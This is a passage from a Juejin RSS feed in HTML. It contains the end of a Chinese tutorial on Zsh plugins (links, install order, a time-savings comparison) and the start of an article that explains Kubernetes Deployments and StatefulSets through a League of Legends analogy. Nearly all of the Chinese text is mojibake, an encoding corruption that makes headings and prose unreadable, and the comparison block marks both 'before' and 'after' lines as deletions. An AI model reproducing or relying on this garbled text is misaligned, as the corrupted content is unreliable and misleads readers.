<li><strong>Awesome Zsh Plugins</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Funixorn%2Fawesome-zsh-plugins" target="_blank" title="https://github.com/unixorn/awesome-zsh-plugins" ref="nofollow noopener noreferrer">github.com/unixorn/aweâ€¦</a></li>
<li><strong>Oh My Zsh æ’ä»¶åˆ—è¡¨</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fohmyzsh%2Fohmyzsh%2Fwiki%2FPlugins" target="_blank" title="https://github.com/ohmyzsh/ohmyzsh/wiki/Plugins" ref="nofollow noopener noreferrer">github.com/ohmyzsh/ohmâ€¦</a></li>
</ul>
<h4 data-id="heading-117">ä¸»é¢˜èµ„æº</h4>
<ul>
<li><strong>Powerlevel10k</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fromkatv%2Fpowerlevel10k" target="_blank" title="https://github.com/romkatv/powerlevel10k" ref="nofollow noopener noreferrer">github.com/romkatv/powâ€¦</a></li>
<li><strong>Oh My Zsh ä¸»é¢˜</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fohmyzsh%2Fohmyzsh%2Fwiki%2FThemes" target="_blank" title="https://github.com/ohmyzsh/ohmyzsh/wiki/Themes" ref="nofollow noopener noreferrer">github.com/ohmyzsh/ohmâ€¦</a></li>
</ul>
<h4 data-id="heading-118">å·¥å…·æ–‡æ¡£</h4>
<ul>
<li><strong>fzf Wiki</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fjunegunn%2Ffzf%2Fwiki" target="_blank" title="https://github.com/junegunn/fzf/wiki" ref="nofollow noopener noreferrer">github.com/junegunn/fzâ€¦</a></li>
<li><strong>bat æ–‡æ¡£</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsharkdp%2Fbat" target="_blank" title="https://github.com/sharkdp/bat" ref="nofollow noopener noreferrer">github.com/sharkdp/bat</a></li>
<li><strong>ripgrep æ–‡æ¡£</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FBurntSushi%2Fripgrep" target="_blank" title="https://github.com/BurntSushi/ripgrep" ref="nofollow noopener noreferrer">github.com/BurntSushi/â€¦</a></li>
</ul>
<h4 data-id="heading-119">å­¦ä¹ èµ„æº</h4>
<ul>
<li><strong>Zsh æ•™ç¨‹ï¼ˆä¸­æ–‡ï¼‰</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.runoob.com%2Flinux%2Flinux-shell.html" target="_blank" title="https://www.runoob.com/linux/linux-shell.html" ref="nofollow noopener noreferrer">www.runoob.com/linux/linuxâ€¦</a></li>
<li><strong>å‘½ä»¤è¡Œè‰ºæœ¯ï¼ˆä¸­æ–‡ï¼‰</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fjlevy%2Fthe-art-of-command-line%2Fblob%2Fmaster%2FREADME-zh.md" target="_blank" title="https://github.com/jlevy/the-art-of-command-line/blob/master/README-zh.md" ref="nofollow noopener noreferrer">github.com/jlevy/the-aâ€¦</a></li>
</ul>
<hr/>
<h3 data-id="heading-120">ğŸ“ å†™åœ¨æœ€å</h3>
<h4 data-id="heading-121">æœ¬æ–‡æ¡£ç‰¹è‰²</h4>
<p>âœ… <strong>æ–°æ‰‹å‹å¥½</strong>ï¼šä»é›¶è®²è§£æ ¸å¿ƒæ¦‚å¿µï¼Œä¸æ‡‚æŠ€æœ¯ä¹Ÿèƒ½çœ‹æ‡‚<br/>
âœ… <strong>åˆ†æƒ…å†µæŒ‡å¯¼</strong>ï¼šé’ˆå¯¹"å·²æœ‰ Zsh"ã€"åªæœ‰ Git Bash"ç­‰ä¸åŒæƒ…å†µæä¾›å¯¹åº”æ–¹æ¡ˆ<br/>
âœ… <strong>å›¾æ–‡å¹¶èŒ‚</strong>ï¼šç”¨ç±»æ¯”ã€å¯¹æ¯”ã€æµç¨‹å›¾å¸®åŠ©ç†è§£<br/>
âœ… <strong>å‘½ä»¤å³ç”¨</strong>ï¼šæ‰€æœ‰å‘½ä»¤éƒ½ç»è¿‡éªŒè¯ï¼Œå¤åˆ¶å³å¯ä½¿ç”¨<br/>
âœ… <strong>æŒç»­æ›´æ–°</strong>ï¼šæ ¹æ®æœ€æ–°æ’ä»¶ç”Ÿæ€å’Œç”¨æˆ·åé¦ˆæŒç»­ä¼˜åŒ–</p>
<h4 data-id="heading-122">æ¨èå®‰è£…é¡ºåº</h4>
<pre><code class="hljs">ç¬¬1å¤©ï¼ˆ15åˆ†é’Ÿï¼‰ï¼š
â””â”€ åŸºç¡€å®‰è£…ï¼šZsh + Oh My Zsh æˆ– Git Bash

ç¬¬2å¤©ï¼ˆ10åˆ†é’Ÿï¼‰ï¼š
â””â”€ å¿…å¤‡ä¸‰ä»¶å¥—ï¼šfzf + Git åˆ«å + z

ç¬¬3å¤©ï¼ˆ5åˆ†é’Ÿï¼‰ï¼š
â””â”€ è¯­æ³•é«˜äº®ï¼šzsh-syntax-highlighting æˆ– bash-git-prompt

ç¬¬4å¤©ï¼ˆ5åˆ†é’Ÿï¼‰ï¼š
â””â”€ è‡ªåŠ¨è¡¥å…¨ï¼šzsh-autosuggestions

ç¬¬5å¤©+ï¼ˆæŒ‰éœ€ï¼‰ï¼š
â””â”€ å…¶ä»–å·¥å…·ï¼šbatã€ripgrepã€starship ç­‰
</code></pre>
<h4 data-id="heading-123">æ•ˆç‡æå‡å¯¹æ¯”</h4>
<pre><code class="hljs language-diff" lang="diff">å®‰è£…å‰ï¼š
<span class="hljs-deletion">- æ‰¾å†å²å‘½ä»¤ï¼šç¿»ç»ˆç«¯è®°å½• 30 ç§’</span>
<span class="hljs-deletion">- åˆ‡æ¢ç›®å½•ï¼šcd ../../../src/components/  10 ç§’</span>
<span class="hljs-deletion">- æ•² Git å‘½ä»¤ï¼šgit status + git add --all  15 ç§’</span>
<span class="hljs-deletion">- æŸ¥æ‰¾æ–‡ä»¶ï¼šæ‰‹åŠ¨ ls å¤šä¸ªç›®å½•  20 ç§’</span>
å¹³å‡æ¯å°æ—¶æµªè´¹æ—¶é—´ï¼š~30 åˆ†é’Ÿ

å®‰è£…åï¼š
<span class="hljs-deletion">- æ‰¾å†å²å‘½ä»¤ï¼šCtrl+R  3 ç§’ âš¡</span>
<span class="hljs-deletion">- åˆ‡æ¢ç›®å½•ï¼šz comp  2 ç§’ âš¡</span>
<span class="hljs-deletion">- æ•² Git å‘½ä»¤ï¼šgst + gaa  3 ç§’ âš¡</span>
<span class="hljs-deletion">- æŸ¥æ‰¾æ–‡ä»¶ï¼šCtrl+T  2 ç§’ âš¡</span>
å¹³å‡æ¯å°æ—¶èŠ‚çœæ—¶é—´ï¼š~25 åˆ†é’Ÿ

ä¸€å¹´èŠ‚çœæ—¶é—´ï¼š~200 å°æ—¶ â‰ˆ 25 ä¸ªå·¥ä½œæ—¥ï¼
</code></pre>
<hr/>
<p><strong>æ–‡æ¡£ç‰ˆæœ¬</strong>: v3.0ï¼ˆæ¦‚å¿µå¢å¼ºç‰ˆï¼‰<br/>
<strong>æœ€åæ›´æ–°</strong>: 2025-12-29<br/>
<strong>é€‚ç”¨äººç¾¤</strong>: æ–°æ‰‹ ~ è¿›é˜¶ç”¨æˆ·<br/>
<strong>é¢„è®¡é˜…è¯»æ—¶é—´</strong>: å®Œæ•´é˜…è¯» 30 åˆ†é’Ÿï¼Œå¿«é€Ÿä¸Šæ‰‹ 10 åˆ†é’Ÿ</p>
<blockquote>
<p>ğŸ’¡ <strong>æ¸©é¦¨æç¤º</strong>ï¼š</p>
<ol>
<li>ä¸è¦ä¸€æ¬¡è£…æ‰€æœ‰æ’ä»¶ï¼Œä»å¿…å¤‡çš„å¼€å§‹ï¼Œé€æ­¥æ·»åŠ </li>
<li>é‡åˆ°é—®é¢˜å…ˆçœ‹"å¸¸è§é—®é¢˜"ç« èŠ‚ï¼Œ90% çš„é—®é¢˜éƒ½æœ‰ç­”æ¡ˆ</li>
<li>ä¿å­˜å¥½é…ç½®æ–‡ä»¶ï¼ˆ.zshrc æˆ– .bashrcï¼‰ï¼Œæ¢ç”µè„‘ç›´æ¥å¤åˆ¶å³å¯</li>
<li>å®šæœŸæ›´æ–°æ’ä»¶ï¼š<code>omz update</code> æˆ– <code>scoop update *</code></li>
</ol>
</blockquote>
<p><strong>ç¥ä½ çš„ç»ˆç«¯æ•ˆç‡ç¿»å€ï¼ğŸš€</strong></p>
<blockquote>
<p>å…¶ä»–æ’ä»¶å®‰è£…æ•™ç¨‹æ–‡æ¡£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fszthanatos.github.io%2Ftopic%2Fwsl2%2Fcoding_with_wsl2_04%2F" target="_blank" title="https://szthanatos.github.io/topic/wsl2/coding_with_wsl2_04/" ref="nofollow noopener noreferrer">szthanatos.github.io/topic/wsl2/â€¦</a></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€Kubernetesã€‘ä»¥LOLçš„è§†è§’æ‰“å¼€K8s]]></title>    <link>https://juejin.cn/post/7588999772750659619</link>    <guid>https://juejin.cn/post/7588999772750659619</guid>    <pubDate>2025-12-29T09:09:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588999772750659619" data-draft-id="7589074117644009507" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€Kubernetesã€‘ä»¥LOLçš„è§†è§’æ‰“å¼€K8s"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-29T09:09:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ThisIsClark"/> <meta itemprop="url" content="https://juejin.cn/user/518625216693341"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€Kubernetesã€‘ä»¥LOLçš„è§†è§’æ‰“å¼€K8s
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/518625216693341/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ThisIsClark
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:09:14.000Z" title="Mon Dec 29 2025 09:09:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>å¯¹äºå¤§éƒ¨åˆ†åç«¯ç¨‹åºå‘˜ä¹ƒè‡³äºéåç«¯ç¨‹åºå‘˜æ¥è¯´ï¼Œåœ¨å½“å‰çš„äº‘åŸç”Ÿæ—¶ä»£ï¼ŒKubernetesï¼ˆåç§°K8sï¼‰éƒ½æ˜¯ç»•ä¸å¼€çš„ä¸€é¡¹æŠ€æœ¯ï¼›åŒæ—¶ï¼Œå¯¹äºè¿™ä¸ªæ—¶ä»£çš„ç¨‹åºå‘˜æ¥è¯´ï¼Œâ€œè‹±é›„è”ç›Ÿâ€ï¼ˆåç§°LOLï¼‰ä¹Ÿæ˜¯é™ªä¼´åŒ…æ‹¬æˆ‘åœ¨å†…çš„å¾ˆå¤šäººæˆé•¿çš„ä¸€æ¬¾æ¸¸æˆã€‚</p>
<p>åœ¨æˆ‘çš„å·¥ä½œç»å†ä¸­ï¼Œå¸¸å¸¸åœ¨ç»„å†…æœ‰å°ä¼™ä¼´éœ€è¦ä½¿ç”¨åˆ°K8sçš„æ—¶å€™å¯¹K8sæ²¡æœ‰å¿…è¦çš„æ¦‚å¿µï¼Œä½†æ˜¯æˆ‘å‘ç°å’Œä»–ä»¬èŠèµ·LOLå´æ€»èƒ½æ‰¾åˆ°å…±åŒè¯­è¨€ï¼Œæ‰€ä»¥æˆ‘å°±åœ¨æƒ³ï¼Œæ—¢ç„¶K8sæœ¬èº«çš„å­¦ä¹ æ›²çº¿ä¸æ˜¯é‚£ä¹ˆå¹³ç¼“ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯å¯ä»¥å€ŸåŠ©LOLæ¥å¸®å¤§å®¶ç†è§£ä»€ä¹ˆæ˜¯K8så‘¢ï¼Ÿ</p>
<h2 data-id="heading-1">ç›®çš„</h2>
<p>æœ¬ç³»åˆ—æ–‡ç« çš„ç›®çš„æ˜¯å€ŸåŠ©LOLï¼Œå¸®å¤§å®¶æ›´å¥½åœ°ç†è§£K8sï¼Œå…¥é—¨K8sï¼Œä¸Šæ‰‹K8sã€‚</p>
<h2 data-id="heading-2">è®¾è®¡çš„å†…æ ¸</h2>
<p>æ¯ä¸€é¡¹äº§å“éƒ½æœ‰å®ƒçš„ä¸€ä¸ªè®¾è®¡çš„å†…æ ¸ï¼Œå¯¹äºLOLæ¥è¯´ï¼Œå®ƒæœ¬è´¨æ˜¯ä¸€æ¬¾æ¸¸æˆï¼Œå®ƒçš„å†…æ ¸å°±æ˜¯â€œé€šè¿‡å„ç§æ‰‹æ®µï¼Œæ‘§æ¯å¯¹æ–¹çš„åŸºåœ°â€ï¼Œä¸ç®¡ä½ æ˜¯é€šè¿‡å…µçº¿è¿è¥ã€å‡»æ€å¯¹æ‰‹ã€æ§åˆ¶ä¸­ç«‹èµ„æºï¼Œè¿™æ‰€æœ‰çš„ä¸€åˆ‡éƒ½æ˜¯å›´ç»•æœ€ç»ˆçš„ç›®çš„ï¼šæ‘§æ¯å¯¹æ–¹çš„åŸºåœ°ï¼Œæ¥æœåŠ¡çš„</p>
<p>é‚£ä¹ˆå¯¹äºK8sæ¥è¯´ï¼Œè®¾è®¡çš„å†…æ ¸å°±æ˜¯æ›´å¥½çš„è¿›è¡Œå®¹å™¨çš„ç®¡ç†ï¼ˆå¯¹äºä»€ä¹ˆæ˜¯å®¹å™¨ï¼Œä¸åœ¨æœ¬æ–‡çš„è®¨è®ºèŒƒå›´å†…ï¼Œå¯ä»¥è‡ªè¡Œæœç´¢ä¸€ä¸‹ï¼‰ï¼Œä¸ç®¡æ˜¯æˆ‘ä»¬åˆ›å»ºdeploymentï¼Œserviceï¼Œstatefulsetï¼Œæˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„ï¼Œéƒ½æ˜¯å¯¹å®¹å™¨è¿›è¡Œç®¡æ§ï¼Œè®©å°è£…åœ¨å®¹å™¨å†…çš„åº”ç”¨æ›´å¥½çš„è¿è¡Œã€‚</p>
<h2 data-id="heading-3">LOLçš„è‹±é›„ - K8sçš„å®¹å™¨</h2>
<p>LOLçš„ä¸€å±€æ¸¸æˆæ˜¯æ ¹æ®è¿™å±€æ¸¸æˆä¸­çš„10ä½è‹±é›„å±•å¼€çš„ã€‚ä¸åŒçš„è‹±é›„æœ‰ä¸åŒçš„å®šä½ï¼šæœ‰äº›æ˜¯APè‹±é›„ã€æœ‰äº›æ˜¯ADè‹±é›„ï¼›æœ‰äº›æ“…é•¿è¾“å‡ºï¼Œæœ‰äº›æ“…é•¿è¾…åŠ©ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e9be2c6be7b49fcb9f8060a7857ebf2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVGhpc0lzQ2xhcms=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767604154&amp;x-signature=MgL%2F%2ByeJGcSc4H96DQYgeVXh1DQ%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>åŒæ ·ï¼Œå¯¹äºK8sæ¥è¯´ï¼Œä¸€å¥—K8sé›†ç¾¤éƒ½æ˜¯å›´ç»•ç€é›†ç¾¤ä¸­çš„å®¹å™¨åœ¨è¿è½¬ï¼Œå°±åƒk8så®˜æ–¹æè¿°çš„é‚£æ ·ï¼Œå®ƒæ˜¯ä¸€ä¸ª<strong>å®¹å™¨ç¼–æ’å¹³å°</strong>ã€‚æ­è½½ä¸åŒä¸šåŠ¡çš„å®¹å™¨æœ‰ä¸åŒçš„ç¼–æ’æ–¹å¼ï¼šæœ‰äº›éœ€è¦æŒä¹…åŒ–æ•°æ®ï¼Œæœ‰äº›åªç”¨å¤„ç†ä¸€äº›æ— çŠ¶æ€çš„è¯·æ±‚ï¼›æœ‰äº›éœ€è¦å¯¹å¤–æš´éœ²ç«¯å£ï¼Œæœ‰äº›åˆ™åœ¨å®¹å™¨å†…è‡ªå·±ç©å°±è¡Œã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f3c96a21b9e4d6f8080f7522831f5b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVGhpc0lzQ2xhcms=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767604154&amp;x-signature=yI4jU6SMchOQMoatE1GFOK07drw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">LOLçš„è‹±é›„å®šä½ - K8sçš„å·¥ä½œè´Ÿè½½èµ„æº</h2>
<p>åœ¨LOLä¸­ï¼Œæœ‰äº†è‹±é›„ï¼Œæˆ‘ä»¬è¦ç»™å®ƒåˆ†é…ä¸åŒçš„å®šä½ï¼šä¸Šè·¯ã€ä¸­è·¯ã€ä¸‹è·¯ã€æ‰“é‡ã€è¾…åŠ©ï¼Œä¸åŒåœºæ™¯éœ€è¦ä¸åŒå®šä½çš„è‹±é›„ï¼Œæ¯”å¦‚ä½œä¸ºè¾…åŠ©çš„é£å¥³å°±æ˜¯æ²¡åŠæ³•æ›¿ä»£ç›²åƒ§å–é‡åŒºåˆ·é‡ï¼Œä½œä¸ºæˆ˜å£«çš„ç›–ä¼¦ä¹Ÿæ²¡æ³•æ›¿ä»£å¥³æªåœ¨åæœŸä½œä¸ºå°„æ‰‹æä¾›è¾“å‡ºã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f3ed025296e248d695aa8aad3e569c5f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVGhpc0lzQ2xhcms=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767604154&amp;x-signature=cRDmE0sepMMWdi%2BmcFRnnH2bdwc%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>K8sä¹Ÿæ˜¯ä¸€æ ·ï¼Œæœ‰äº†é•œåƒæˆ–è€…è¯´åº”ç”¨ï¼Œæˆ‘ä»¬è¦ç»™å®ƒé…ç½®ä¸åŒçš„å·¥ä½œè´Ÿè½½èµ„æºWorkload Resourcesã€‚K8sä¸­çš„å·¥ä½œè´Ÿè½½èµ„æºï¼ˆWorkload Resourcesï¼‰æ˜¯ç”¨äºç®¡ç†åº”ç”¨çš„éƒ¨ç½²ã€æ‰©å±•å’Œæ“ä½œçš„æ ¸å¿ƒæ¦‚å¿µã€‚è¿™äº›èµ„æºå¸®åŠ©ç”¨æˆ·å®šä¹‰åº”ç”¨ç¨‹åºçš„æœŸæœ›çŠ¶æ€ï¼Œå¹¶è‡ªåŠ¨å¤„ç†å®é™…çŠ¶æ€ä¸æœŸæœ›çŠ¶æ€ä¹‹é—´çš„å·®å¼‚ã€‚ä»¥ä¸‹æ˜¯å‡ ç§ä¸»è¦çš„å·¥ä½œè´Ÿè½½èµ„æºåŠå…¶é€‚ç”¨åœºæ™¯ï¼š</p>
<h4 data-id="heading-5">ğŸŒ€ â€‹<strong>â€‹Deploymentâ€‹</strong>â€‹</h4>
<p>â€‹<strong>â€‹åŠŸèƒ½â€‹</strong>â€‹ï¼šç®¡ç†æ— çŠ¶æ€åº”ç”¨çš„ Pod å‰¯æœ¬é›†ï¼Œæ”¯æŒå£°æ˜å¼æ›´æ–°ã€æ»šåŠ¨å‡çº§å’Œå›æ»šã€‚<br/>
â€‹<strong>â€‹æ ¸å¿ƒç‰¹æ€§â€‹</strong>â€‹ï¼š</p>
<ul>
<li>â€‹<strong>â€‹æ»šåŠ¨æ›´æ–°â€‹</strong>â€‹ï¼šé€šè¿‡ <code>maxUnavailable</code>ï¼ˆæœ€å¤§ä¸å¯ç”¨ Pod æ•°ï¼‰å’Œ <code>maxSurge</code>ï¼ˆæœ€å¤§é¢å¤– Pod æ•°ï¼‰æ§åˆ¶æ›´æ–°èŠ‚å¥ã€‚</li>
<li>â€‹<strong>â€‹è‡ªåŠ¨æ¢å¤â€‹</strong>â€‹ï¼šPod æ•…éšœæ—¶è‡ªåŠ¨æ›¿æ¢ï¼Œç¡®ä¿å‰¯æœ¬æ•°ç¬¦åˆé¢„æœŸã€‚</li>
<li>â€‹<strong>â€‹ç‰ˆæœ¬æ§åˆ¶â€‹</strong>â€‹ï¼šä¿ç•™å†å²ç‰ˆæœ¬ï¼ˆé»˜è®¤ 10 ä¸ªï¼‰ï¼Œæ”¯æŒä¸€é”®å›æ»šã€‚<br/>
â€‹<strong>â€‹é€‚ç”¨åœºæ™¯â€‹</strong>â€‹ï¼š</li>
<li>Web æœåŠ¡ã€API ç½‘å…³ç­‰æ— éœ€æŒä¹…åŒ–çŠ¶æ€çš„åº”ç”¨ã€‚</li>
<li>éœ€é¢‘ç¹æ›´æ–°æˆ–åŠ¨æ€æ‰©ç¼©å®¹çš„æœåŠ¡ï¼ˆå¦‚å¾®æœåŠ¡åç«¯ï¼‰ã€‚</li>
</ul>
<hr/>
<h4 data-id="heading-6">ğŸ§© â€‹<strong>â€‹StatefulSetâ€‹</strong>â€‹</h4>
<p>â€‹<strong>â€‹åŠŸèƒ½â€‹</strong>â€‹ï¼šä¸“ä¸ºæœ‰çŠ¶æ€åº”ç”¨è®¾è®¡ï¼Œæä¾›ç¨³å®šç½‘ç»œæ ‡è¯†ã€æŒä¹…åŒ–å­˜å‚¨å’Œæœ‰åºæ“ä½œã€‚<br/>
â€‹<strong>â€‹æ ¸å¿ƒç‰¹æ€§â€‹</strong>â€‹ï¼š</p>
<ul>
<li>â€‹<strong>â€‹ç¨³å®šæ ‡è¯†â€‹</strong>â€‹ï¼šPod åç§°å›ºå®šï¼ˆå¦‚ <code>web-0</code>ã€<code>web-1</code>ï¼‰ï¼ŒDNS è®°å½•æŒä¹…åŒ–ï¼ˆ<code>&lt;pod-name&gt;.&lt;service-name&gt;.svc</code>ï¼‰ã€‚</li>
<li>â€‹<strong>â€‹æŒä¹…åŒ–å­˜å‚¨â€‹</strong>â€‹ï¼šé€šè¿‡ <code>volumeClaimTemplates</code> ä¸ºæ¯ä¸ª Pod åŠ¨æ€åˆ›å»ºç‹¬ç«‹ PVï¼Œæ•°æ®ä¸ Pod ç”Ÿå‘½å‘¨æœŸè§£è€¦ã€‚</li>
<li>â€‹<strong>â€‹æœ‰åºæ“ä½œâ€‹</strong>â€‹ï¼šé¡ºåºåˆ›å»ºï¼ˆ<code>0â†’1â†’2</code>ï¼‰ã€é€†åºåˆ é™¤ï¼ˆ<code>2â†’1â†’0</code>ï¼‰ï¼Œæ»šåŠ¨æ›´æ–°æ—¶æŒ‰ç´¢å¼•åå‘æ›¿æ¢ã€‚<br/>
â€‹<strong>â€‹é€‚ç”¨åœºæ™¯â€‹</strong>â€‹ï¼š</li>
<li>æ•°æ®åº“é›†ç¾¤ï¼ˆMySQLã€PostgreSQLï¼‰ã€æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆKafkaã€RabbitMQï¼‰ã€‚</li>
<li>åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿï¼ˆElasticsearchã€Cassandraï¼‰ã€‚<br/>
â€‹<strong>â€‹æ³¨æ„äº‹é¡¹â€‹</strong>â€‹ï¼š</li>
